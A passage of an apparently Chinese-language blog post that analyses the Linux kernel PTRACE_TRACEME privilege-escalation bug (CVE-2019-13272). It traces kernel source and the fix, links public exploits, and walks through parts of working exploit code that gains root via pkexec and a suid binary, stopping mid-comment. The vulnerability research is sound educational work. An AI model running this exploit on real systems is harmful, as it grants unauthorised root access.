<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1111</span> SYSCALL_DEFINE4(ptrace, <span class="keyword">long</span>, request, <span class="keyword">long</span>, pid, <span class="keyword">unsigned</span> <span class="keyword">long</span>, addr,</span><br><span class="line"><span class="number">1112</span>                 <span class="keyword">unsigned</span> <span class="keyword">long</span>, data)</span><br><span class="line"><span class="number">1113</span> &#123;</span><br><span class="line"><span class="number">1114</span>         <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">child</span>;</span></span><br><span class="line"><span class="number">1115</span>         <span class="keyword">long</span> ret;</span><br><span class="line"><span class="number">1116</span> </span><br><span class="line"><span class="number">1117</span>         <span class="keyword">if</span> (request == PTRACE_TRACEME) &#123;</span><br><span class="line"><span class="number">1118</span>                 ret = ptrace_traceme(); <span class="comment">// &lt;----- 进入 traceme 分支</span></span><br><span class="line"><span class="number">1119</span>                 <span class="keyword">if</span> (!ret)</span><br><span class="line"><span class="number">1120</span>                         arch_ptrace_attach(current);</span><br><span class="line"><span class="number">1121</span>                 <span class="keyword">goto</span> out;</span><br><span class="line"><span class="number">1122</span>         &#125;</span><br><span class="line"><span class="number">1123</span> </span><br><span class="line"><span class="number">1124</span>         child = find_get_task_by_vpid(pid);</span><br><span class="line"><span class="number">1125</span>         <span class="keyword">if</span> (!child) &#123;</span><br><span class="line"><span class="number">1126</span>                 ret = -ESRCH;</span><br><span class="line"><span class="number">1127</span>                 <span class="keyword">goto</span> out;</span><br><span class="line"><span class="number">1128</span>         &#125;</span><br><span class="line"><span class="number">1129</span> </span><br><span class="line"><span class="number">1130</span>         <span class="keyword">if</span> (request == PTRACE_ATTACH || request == PTRACE_SEIZE) &#123;</span><br><span class="line"><span class="number">1131</span>                 ret = ptrace_attach(child, request, addr, data); <span class="comment">// &lt;------ 进入 attach 分支</span></span><br><span class="line"><span class="number">1132</span>                 <span class="comment">/*</span></span><br><span class="line"><span class="comment">1133                  * Some architectures need to do book-keeping after</span></span><br><span class="line"><span class="comment">1134                  * a ptrace attach.</span></span><br><span class="line"><span class="comment">1135                  */</span></span><br><span class="line"><span class="number">1136</span>                 <span class="keyword">if</span> (!ret)</span><br><span class="line"><span class="number">1137</span>                         arch_ptrace_attach(child);</span><br><span class="line"><span class="number">1138</span>                 <span class="keyword">goto</span> out_put_task_struct;</span><br><span class="line"><span class="number">1139</span>         &#125;</span><br><span class="line"><span class="number">1140</span> </span><br><span class="line"><span class="number">1141</span>         ret = ptrace_check_attach(child, request == PTRACE_KILL ||</span><br><span class="line"><span class="number">1142</span>                                   request == PTRACE_INTERRUPT);</span><br><span class="line"><span class="number">1143</span>         <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">1144</span>                 <span class="keyword">goto</span> out_put_task_struct;</span><br><span class="line"><span class="number">1145</span> </span><br><span class="line"><span class="number">1146</span>         ret = arch_ptrace(child, request, addr, data); <span class="comment">// &lt;---- 其他 ptrace request </span></span><br><span class="line"><span class="number">1147</span>         <span class="keyword">if</span> (ret || request != PTRACE_DETACH)</span><br><span class="line"><span class="number">1148</span>                 ptrace_unfreeze_traced(child);</span><br><span class="line"><span class="number">1149</span> </span><br><span class="line"><span class="number">1150</span>  out_put_task_struct:</span><br><span class="line"><span class="number">1151</span>         put_task_struct(child);</span><br><span class="line"><span class="number">1152</span>  out:</span><br><span class="line"><span class="number">1153</span>         <span class="keyword">return</span> ret;</span><br><span class="line"><span class="number">1154</span> &#125;</span><br></pre></td></tr></table></figure>

<p>如上， 由于 task B 和 task C 此时已经存在 trace link， 所以通过 B 向 C 可以直接发送 ptrace request， 将进入函数 arch_ptrace</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">arch/x86/kernel/ptrace.c</span><br><span class="line"></span><br><span class="line">arch_ptrace </span><br><span class="line">	-&gt; ptrace_request </span><br><span class="line">		-&gt; generic_ptrace_peekdata</span><br><span class="line">		   generic_ptrace_pokedata </span><br><span class="line">			-&gt; ptrace_access_vm </span><br><span class="line">				-&gt; ptracer_capable </span><br><span class="line"></span><br><span class="line"> kernel/ptrace.c</span><br><span class="line"> <span class="number">884</span> <span class="function"><span class="keyword">int</span> <span class="title">ptrace_request</span><span class="params">(struct task_struct *child, <span class="keyword">long</span> request,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="number">885</span>                    <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> data)</span></span></span><br><span class="line"><span class="function"> 886 </span>&#123;</span><br><span class="line"> <span class="number">887</span>         <span class="keyword">bool</span> seized = child-&gt;ptrace &amp; PT_SEIZED;</span><br><span class="line"> <span class="number">888</span>         <span class="keyword">int</span> ret = -EIO;</span><br><span class="line"> <span class="number">889</span>         <span class="keyword">siginfo_t</span> siginfo, *si;</span><br><span class="line"> <span class="number">890</span>         <span class="keyword">void</span> __user *datavp = (<span class="keyword">void</span> __user *) data;</span><br><span class="line"> <span class="number">891</span>         <span class="keyword">unsigned</span> <span class="keyword">long</span> __user *datalp = datavp;</span><br><span class="line"> <span class="number">892</span>         <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"> <span class="number">893</span> </span><br><span class="line"> <span class="number">894</span>         <span class="keyword">switch</span> (request) &#123;</span><br><span class="line"> <span class="number">895</span>         <span class="keyword">case</span> PTRACE_PEEKTEXT:</span><br><span class="line"> <span class="number">896</span>         <span class="keyword">case</span> PTRACE_PEEKDATA:</span><br><span class="line"> <span class="number">897</span>                 <span class="keyword">return</span> generic_ptrace_peekdata(child, addr, data);</span><br><span class="line"> <span class="number">898</span>         <span class="keyword">case</span> PTRACE_POKETEXT:</span><br><span class="line"> <span class="number">899</span>         <span class="keyword">case</span> PTRACE_POKEDATA:</span><br><span class="line"> <span class="number">900</span>                 <span class="keyword">return</span> generic_ptrace_pokedata(child, addr, data);</span><br><span class="line"> <span class="number">901</span> </span><br><span class="line"> =================== skip ================</span><br><span class="line"> <span class="number">1105</span> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="number">1156</span> <span class="keyword">int</span> generic_ptrace_peekdata(struct task_struct *tsk, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span><br><span class="line"> <span class="number">1157</span>                             <span class="keyword">unsigned</span> <span class="keyword">long</span> data)</span><br><span class="line"> <span class="number">1158</span> &#123;</span><br><span class="line"> <span class="number">1159</span>         <span class="keyword">unsigned</span> <span class="keyword">long</span> tmp;</span><br><span class="line"> <span class="number">1160</span>         <span class="keyword">int</span> copied;</span><br><span class="line"> <span class="number">1161</span> </span><br><span class="line"> <span class="number">1162</span>         copied = ptrace_access_vm(tsk, addr, &amp;tmp, <span class="keyword">sizeof</span>(tmp), FOLL_FORCE); <span class="comment">// &lt;--- 调用 ptrace_access_vm</span></span><br><span class="line"> <span class="number">1163</span>         <span class="keyword">if</span> (copied != <span class="keyword">sizeof</span>(tmp))</span><br><span class="line"> <span class="number">1164</span>                 <span class="keyword">return</span> -EIO;</span><br><span class="line"> <span class="number">1165</span>         <span class="keyword">return</span> put_user(tmp, (<span class="keyword">unsigned</span> <span class="keyword">long</span> __user *)data);</span><br><span class="line"> <span class="number">1166</span> &#125;</span><br><span class="line"> <span class="number">1167</span> </span><br><span class="line"> <span class="number">1168</span> <span class="function"><span class="keyword">int</span> <span class="title">generic_ptrace_pokedata</span><span class="params">(struct task_struct *tsk, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="number">1169</span>                             <span class="keyword">unsigned</span> <span class="keyword">long</span> data)</span></span></span><br><span class="line"><span class="function"> 1170 </span>&#123;</span><br><span class="line"> <span class="number">1171</span>         <span class="keyword">int</span> copied;</span><br><span class="line"> <span class="number">1172</span> </span><br><span class="line"> <span class="number">1173</span>         copied = ptrace_access_vm(tsk, addr, &amp;data, <span class="keyword">sizeof</span>(data), <span class="comment">// &lt;---- 调用 ptrace_access_vm</span></span><br><span class="line"> <span class="number">1174</span>                         FOLL_FORCE | FOLL_WRITE);</span><br><span class="line"> <span class="number">1175</span>         <span class="keyword">return</span> (copied == <span class="keyword">sizeof</span>(data)) ? <span class="number">0</span> : -EIO;</span><br><span class="line"> <span class="number">1176</span> &#125;</span><br></pre></td></tr></table></figure>

<p>如上，当 tracer 想要控制 tracee 执行新的代码逻辑时，需要发送 request 读写 tracee 的代码区和内存区， 对应的 request 是 PTRACE_PEEKTEXT / PTRACE_PEEKDATA / PTRACE_POKETEXT / PTRACE_POKEDATA </p>
<p>这几种读写操作最终都是通过函数 ptrace_access_vm 实现的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">kernel/ptrace.c</span><br><span class="line"><span class="number">38</span> <span class="function"><span class="keyword">int</span> <span class="title">ptrace_access_vm</span><span class="params">(struct task_struct *tsk, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">39</span>                      <span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags)</span></span></span><br><span class="line"><span class="function">40 </span>&#123;</span><br><span class="line"><span class="number">41</span>         <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line"><span class="number">42</span>         <span class="keyword">int</span> ret;</span><br><span class="line"><span class="number">43</span> </span><br><span class="line"><span class="number">44</span>         mm = get_task_mm(tsk);</span><br><span class="line"><span class="number">45</span>         <span class="keyword">if</span> (!mm)</span><br><span class="line"><span class="number">46</span>                 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">47</span> </span><br><span class="line"><span class="number">48</span>         <span class="keyword">if</span> (!tsk-&gt;ptrace ||</span><br><span class="line"><span class="number">49</span>             (current != tsk-&gt;parent) ||</span><br><span class="line"><span class="number">50</span>             ((get_dumpable(mm) != SUID_DUMP_USER) &amp;&amp;</span><br><span class="line"><span class="number">51</span>              !ptracer_capable(tsk, mm-&gt;user_ns))) &#123; <span class="comment">// &lt; ----- 又是调用 ptracer_capable 函数</span></span><br><span class="line"><span class="number">52</span>                 mmput(mm);</span><br><span class="line"><span class="number">53</span>                 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">54</span>         &#125;</span><br><span class="line"><span class="number">55</span> </span><br><span class="line"><span class="number">56</span>         ret = __access_remote_vm(tsk, mm, addr, buf, len, gup_flags);</span><br><span class="line"><span class="number">57</span>         mmput(mm);</span><br><span class="line"><span class="number">58</span> </span><br><span class="line"><span class="number">59</span>         <span class="keyword">return</span> ret;</span><br><span class="line"><span class="number">60</span> &#125;</span><br><span class="line"></span><br><span class="line">kernel/capability.c</span><br><span class="line"><span class="number">499</span> <span class="function"><span class="keyword">bool</span> <span class="title">ptracer_capable</span><span class="params">(struct task_struct *tsk, struct user_namespace *ns)</span></span></span><br><span class="line"><span class="function">500 </span>&#123;</span><br><span class="line"><span class="number">501</span>         <span class="keyword">int</span> ret = <span class="number">0</span>;  <span class="comment">/* An absent tracer adds no restrictions */</span></span><br><span class="line"><span class="number">502</span>         <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span></span><br><span class="line"><span class="number">503</span>         rcu_read_lock();</span><br><span class="line"><span class="number">504</span>         cred = rcu_dereference(tsk-&gt;ptracer_cred);</span><br><span class="line"><span class="number">505</span>         <span class="keyword">if</span> (cred)</span><br><span class="line"><span class="number">506</span>                 ret = security_capable_noaudit(cred, ns, CAP_SYS_PTRACE);</span><br><span class="line"><span class="number">507</span>         rcu_read_unlock();</span><br><span class="line"><span class="number">508</span>         <span class="keyword">return</span> (ret == <span class="number">0</span>);</span><br><span class="line"><span class="number">509</span> &#125;</span><br></pre></td></tr></table></figure>

<p>如上， ptrace_access_vm 函数会调用我们之前分析到的 ‘ptracer_capable’ 来决定这个 request 是否可以进行, 这是 ‘ptracer_capable’ 函数的第二种使用场景</p>
<p>根据之前我们分析的结果， task C 此时保存的 ptracer_cred 是特权 cred, 所以这时候 ptracer_capable 会通过， 也就是说我们回答了刚刚的问题， 这种情况下，普通权限的 task B 是可以发送 ptrace request 去读写 root 权限的 task C 的内存区和代码区的</p>
<p>至此，task C 记录的这个特权 ptracer_cred 实际上发挥了 2 种作用</p>
<ul>
<li>1，可以让 task C 执行 execve(suid binary) 给自己提权</li>
<li>2，可以让普通权限的 task B 执行 ptrace 读写 task C 的代码区和内存区，从而控制 task C 执行任意操作</li>
</ul>
<p>上面 2 点合起来，不就是完整的提权操作吗?</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>我们仔细回顾上述代码分析过程， 才终于明白补丁描述写的这段话</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PTRACE_TRACEME records the parent<span class="string">'s credentials as if the parent was </span></span><br><span class="line"><span class="string">acting as the subject, but that'</span>s not the <span class="keyword">case</span>.  If a malicious</span><br><span class="line">unprivileged child uses PTRACE_TRACEME and the parent is privileged, and</span><br><span class="line">at a later point, the parent process becomes attacker-controlled</span><br><span class="line">(because it drops privileges and calls execve()), the attacker ends up</span><br><span class="line">with control over two processes with a privileged ptrace relationship,</span><br><span class="line"><span class="built_in">which</span> can be abused to ptrace a suid binary and obtain root privileges.</span><br></pre></td></tr></table></figure>

<p>本质上这个漏洞有点像 <a href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use" target="_blank" rel="noopener">TOCTOU</a> 类漏洞, ptracer_cred 的获取是在 traceme 阶段,  而 ptracer_cred 的应用是在随后的各种 request 阶段， 而在随后的 ptrace request 的时候， tracer 的 cred 可能已经不是一开始建立 trace link 时的那个 cred 了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/kernel/ptrace.c b/kernel/ptrace.c</span><br><span class="line">index <span class="number">8456b</span>6e.<span class="number">.705887</span>f <span class="number">100644</span></span><br><span class="line">--- a/kernel/ptrace.c</span><br><span class="line">+++ b/kernel/ptrace.c</span><br><span class="line">@@ <span class="number">-79</span>,<span class="number">9</span> +<span class="number">79</span>,<span class="number">7</span> @@ <span class="keyword">void</span> __ptrace_link(struct task_struct *child, struct task_struct *new_parent,</span><br><span class="line">  */</span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">void</span> ptrace_link(struct task_struct *child, struct task_struct *new_parent)</span><br><span class="line"> &#123;</span><br><span class="line">-	rcu_read_lock();</span><br><span class="line">-	__ptrace_link(child, new_parent, __task_cred(new_parent));</span><br><span class="line">-	rcu_read_unlock();</span><br><span class="line">+	__ptrace_link(child, new_parent, current_cred());</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>我们再次看看 jann horn 的补丁:   ‘__task_cred(new_parent)’ -&gt; ‘current_cred()’  </p>
<p>补丁的意思是说在 PTRACE_TRACEME 这种场景下， ptracer_cred 记录的不应该是父进程的 cred， 而应该是自己的 cred</p>
<p>所以我觉得从这个变量的用途来说，它其实记录的不是 tracer 的 cred, 而是 ‘trace link creater’ 的 cred</p>
<p>我建议 jann horn 将这个变量名改成 ptracelinkcreater_cred, 当 trace link 由 PTRACE_ATTACH 建立时， 它等于 tracer 的 cred, 当 trace link 由 PTRACE_TRACEME 建立时， 它等于 tracee 的 cred, 它实际上记录的是 trace 关系建立者的权限 !</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>本漏洞利用的关键是找到合适的可执行程序启动 task B, 这个可执行程序要满足如下条件:</p>
<ul>
<li>1, 必须是能被普通权限用户调用</li>
<li>2, 执行时必须有提权到root的阶段</li>
<li>3, 执行提权后必须执行降权</li>
</ul>
<p>(短暂提权到 root 的目的是让 task C 可以获取 root 的 ptracer_cred, 再降权的目的是让 B 能被普通权限的进程 ptrace attach)</p>
<p>这里我列出 3 份 exploit 代码:</p>
<ul>
<li>1 <a href="https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=401217" target="_blank" rel="noopener">jann horn 的 exploit</a> </li>
<li>2 <a href="https://github.com/bcoles/kernel-exploits/blob/master/CVE-2019-13272/poc.c" target="_blank" rel="noopener">bcoles 的 exploit</a> </li>
<li>3 <a href="https://github.com/jiayy/android_vuln_poc-exp/tree/master/EXP-CVE-2019-13272" target="_blank" rel="noopener">jiayy 的 exploit</a></li>
</ul>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=401217" target="_blank" rel="noopener">jann horn 的 exploit</a> 里使用桌面发行版自带的 <a href="http://manpages.ubuntu.com/manpages/trusty/man1/pkexec.1.html" target="_blank" rel="noopener">pkexec</a> 程序用于启动 task B</p>
<p><a href="http://manpages.ubuntu.com/manpages/trusty/man1/pkexec.1.html" target="_blank" rel="noopener">pkexec</a> 允许特权用户以其他用户权限执行另外一个可执行程序， 用于 <a href="https://wiki.archlinux.org/index.php/Polkit" target="_blank" rel="noopener">polkit</a> 认证框架, 当使用 –user 参数时， 刚好可以让进程先提权到  root 然后再降权到指定用户，因此可以用于构建进程 B, 此外需要找到通过 polkit 框架执行的可执行程序(jann horn 把他们成为 helper)， 这些 helper 程序需要满足普通用户用 pkexec 执行它们时不需要认证（很多通过 polkit 执行的程序都需要弹窗认证）, 执行的模式如下:</p>
<ul>
<li>/usr/bin/pkexec –user nonrootuser /user/sbin/some-helper-binary</li>
</ul>
<p><a href="https://github.com/bcoles/kernel-exploits/blob/master/CVE-2019-13272/poc.c" target="_blank" rel="noopener">bcoles 的 exploit</a> 在 jann horn 的基础上增加了寻找更多 helper binary 的代码， 因为 jann horn 的 helper 是一个写死的程序， 在很多发行版并不存在，所以他的 exploit 在很多发行版系统上无法运行， bcoles 的 exploit 可以在更多的发行版上运行成功</p>
<p>本人出于学习的目的，也写了一份 <a href="https://github.com/jiayy/android_vuln_poc-exp/tree/master/EXP-CVE-2019-13272" target="_blank" rel="noopener">jiayy 的 exploit</a>, 因为 helper binary 因不同发行版而异， pkexec 也是桌面发行版才有， 而事实上这个提权漏洞是 linux kernel 的漏洞， 所以我把 jann horn 的 exploit 改成了使用一个 fakepkexec 程序来提权， 而这个 fakepkexec 和 fakehelper 程序手动生成（而不是从目标系统搜索），这样一来学习者可以在任何存在本漏洞的 linux 系统（不需要桌面）运行我的 exploit 进行研究</p>
<h2 id="exploit-分析"><a href="#exploit-分析" class="headerlink" title="exploit 分析"></a>exploit 分析</h2><p>下面简单过一下 exploit 的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">167</span> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"><span class="number">168</span>   <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"stage2"</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="number">169</span>     <span class="keyword">return</span> middle_stage2();</span><br><span class="line"><span class="number">170</span>   <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"stage3"</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="number">171</span>     <span class="keyword">return</span> spawn_shell();</span><br><span class="line"><span class="number">172</span> </span><br><span class="line"><span class="number">173</span>   helper_path = <span class="string">"/tmp/fakehelper"</span>;</span><br><span class="line"><span class="number">174</span> </span><br><span class="line"><span class="number">175</span>   <span class="comment">/*</span></span><br><span class="line"><span class="comment">176    * set up a pipe such that the next write to it will block: packet mode,</span></span><br><span class="line"><span class="comment">177    * limited to one packet</span></span><br><span class="line"><span class="comment">178    */</span></span><br><span class="line"><span class="number">179</span>   SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT));</span><br><span class="line"><span class="number">180</span>   SAFE(fcntl(block_pipe[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>));</span><br><span class="line"><span class="number">181</span>   <span class="keyword">char</span> dummy = <span class="number">0</span>;</span><br><span class="line"><span class="number">182</span>   SAFE(<span class="built_in">write</span>(block_pipe[<span class="number">1</span>], &amp;dummy, <span class="number">1</span>));</span><br><span class="line"><span class="number">183</span> </span><br><span class="line"><span class="number">184</span>   <span class="comment">/* spawn pkexec in a child, and continue here once our child is in execve() */</span></span><br><span class="line"><span class="number">185</span>   <span class="keyword">static</span> <span class="keyword">char</span> middle_stack[<span class="number">1024</span>*<span class="number">1024</span>];</span><br><span class="line"><span class="number">186</span>   <span class="keyword">pid_t</span> midpid = SAFE(clone(middle_main, middle_stack+<span class="keyword">sizeof</span>(middle_stack),</span><br><span class="line"><span class="number">187</span>                             CLONE_VM|CLONE_VFORK|SIGCHLD, <span class="literal">NULL</span>));</span><br><span class="line"><span class="number">188</span>   <span class="keyword">if</span> (!middle_success) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">189</span> </span><br><span class="line">======================= skip =======================</span><br><span class="line"><span class="number">215</span> &#125;</span><br></pre></td></tr></table></figure>

<p>先看行 186, 调用 clone 生成子进程（也就是 task B）, task B 运行 middle_main </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">64</span> <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">middle_main</span><span class="params">(<span class="keyword">void</span> *dummy)</span> </span>&#123;</span><br><span class="line"> <span class="number">65</span>   prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line"> <span class="number">66</span>   <span class="keyword">pid_t</span> middle = getpid();</span><br><span class="line"> <span class="number">67</span> </span><br><span class="line"> <span class="number">68</span>   self_fd = SAFE(<span class="built_in">open</span>(<span class="string">"/proc/self/exe"</span>, O_RDONLY));</span><br><span class="line"> <span class="number">69</span> </span><br><span class="line"> <span class="number">70</span>   <span class="keyword">pid_t</span> child = SAFE(fork());</span><br><span class="line"> <span class="number">71</span>   <span class="keyword">if</span> (child == <span class="number">0</span>) &#123;</span><br><span class="line"> <span class="number">72</span>     prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line"> <span class="number">73</span> </span><br><span class="line"> <span class="number">74</span>     SAFE(dup2(self_fd, <span class="number">42</span>));</span><br><span class="line"> <span class="number">75</span> </span><br><span class="line"> <span class="number">76</span>     <span class="comment">/* spin until our parent becomes privileged (have to be fast here) */</span></span><br><span class="line"> <span class="number">77</span>     <span class="keyword">int</span> proc_fd = SAFE(<span class="built_in">open</span>(tprintf(<span class="string">"/proc/%d/status"</span>, middle), O_RDONLY));</span><br><span class="line"> <span class="number">78</span>     <span class="keyword">char</span> *needle = tprintf(<span class="string">"\nUid:\t%d\t0\t"</span>, getuid());</span><br><span class="line"> <span class="number">79</span>     <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"> <span class="number">80</span>       <span class="keyword">char</span> buf[<span class="number">1000</span>];</span><br><span class="line"> <span class="number">81</span>       <span class="keyword">ssize_t</span> buflen = SAFE(pread(proc_fd, buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>, <span class="number">0</span>));</span><br><span class="line"> <span class="number">82</span>       buf[buflen] = <span class="string">'\0'</span>;</span><br><span class="line"> <span class="number">83</span>       <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, needle)) <span class="keyword">break</span>;</span><br><span class="line"> <span class="number">84</span>     &#125;</span><br><span class="line"> <span class="number">85</span> </span><br><span class="line"> <span class="number">86</span>     <span class="comment">/*</span></span><br><span class="line"><span class="comment"> 87      * this is where the bug is triggered.</span></span><br><span class="line"><span class="comment"> 88      * while our parent is in the middle of pkexec, we force it to become our</span></span><br><span class="line"><span class="comment"> 89      * tracer, with pkexec's creds as ptracer_cred.</span></span><br><span class="line"><span class="comment"> 90      */</span></span><br><span class="line"> <span class="number">91</span>     SAFE(ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>));</span><br><span class="line"> <span class="number">92</span> </span><br><span class="line"> <span class="number">93</span>     <span class="comment">/*</span></span><br><span class="line"><span class="comment"> 94      * now we execute passwd. because the ptrace relationship is considered to</span></span><br><span class="line"><span class="comment"> 95      * be privileged, this is a proper suid execution despite the attached</span></span><br><span class="line"><span class="comment"> 96      * tracer, not a degraded one.</span></span><br><span class="line"><span class="comment"> 97      * at the end of execve(), this process receives a SIGTRAP from ptrace.</span></span><br><span class="line"><span class="comment"> 98      